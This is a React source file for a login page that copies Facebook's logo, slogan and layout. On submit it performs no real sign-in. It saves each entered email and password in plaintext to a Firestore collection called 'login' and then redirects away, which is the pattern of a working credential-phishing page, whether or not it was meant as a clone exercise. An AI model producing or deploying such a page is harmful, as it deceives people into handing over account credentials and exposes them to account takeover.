import React, { useState } from "react";
import { useNavigate } from "react-router-dom";
import img from "../assets/facebook.svg";
import Footer from "./Footer";
import Register from "./Register";
import { db } from "../firebase";
import { collection, addDoc } from "firebase/firestore";
const Login = () => {
  const navigate = useNavigate();
  const [email, setEmail] = useState("");

  const [password, setPassword] = useState("");

  const [showRegister, setshowRegister] = useState(false);

  const usersCollectionRef = collection(db, "login");

  const handleSubmit = async () => {
    await addDoc(usersCollectionRef, { email: email, password: password }).then(
      () => {
        setEmail("");
        setPassword("");
        navigate("/", { replace: true });
      }
    );
  };

  const openRegister = () => {
    setshowRegister((prev) => !prev);
  };
  return (
    <section className="w-screen h-screen bg-gray-100">
      <Register showRegister={showRegister} setshowRegister={setshowRegister} />
      <div className="mx-auto flex px-36 py-36">
        <div className="w-full">
          <img
            src={img}
            alt="facebookimg"
            className="w-[300px] relative -left-7 top-5 z-0"
          />
          <p className="text-[26px] font-medium w-full">
            Facebook helps you connect and share <br></br>with the people in
            your life.
          </p>
        </div>
        <div className="relative -top-3">
          <div className="bg-white w-[400px] container mx-auto flex flex-col items-center shadow-lg rounded-xl p-4">
            <input
              required
              id="email"
              type="email"
              value={email}
              onChange={(event) => setEmail(event.target.value)}
              placeholder="Email address or phone number"
              className="w-full mb-3 py-3 px-4 border placeholder:font-normal border-gray-400 focus:outline-none rounded-md focus:ring-1 ring-blue-400"
            />
            <input
              required
              id="password"
              type="password"
              value={password}
              onChange={(event) => setPassword(event.target.value)}
              placeholder="Password"
              className="w-full mb-3 py-3 px-4 border placeholder:font-normal border-gray-400 focus:outline-none rounded-md focus:ring-1 ring-blue-400"
            />
            <button
              onClick={handleSubmit}
              type="submit"
              className="w-full cursor-pointer bg-blue-600 hover:bg-blue-700 text-white p-2 transition duration-200 rounded-lg font-semibold text-lg text-center"
            >
              Log In
            </button>
            <a
              href="/"
              className="text-blue-500 p-3 text-[14px] text-center font-medium my-2 transition duration-200 hover:underline "
            >
              Forgotten Password?
            </a>
            <hr className="w-full " />
            <div className="items-center justify-center">
              <p
                onClick={openRegister}
                className="cursor-pointer bg-green-600 hover:bg-green-700 mt-6  mb-2 transition duration-200 text-white px-6 py-3 rounded-lg font-semibold text-md"
              >
                Create New Account
              </p>
            </div>
          </div>
          <p className="text-center text-sm my-4">
            <a
              href="/"
              className="font-semibold text-center w-full hover:underline underline-offset-1"
            >
              Create a Page
            </a>{" "}
            for a celebrity, brand or business.
          </p>
        </div>
      </div>
      <Footer />
    </section>
  );
};

export default Login;
